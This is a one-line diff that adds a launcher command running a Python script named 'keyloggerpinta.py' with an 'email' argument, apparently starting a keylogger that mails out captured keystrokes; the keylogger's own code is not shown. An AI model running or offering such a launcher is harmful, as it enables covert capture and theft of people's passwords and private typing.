@@ -1,0 +1,1 @@
+python keyloggerpinta.py email %*
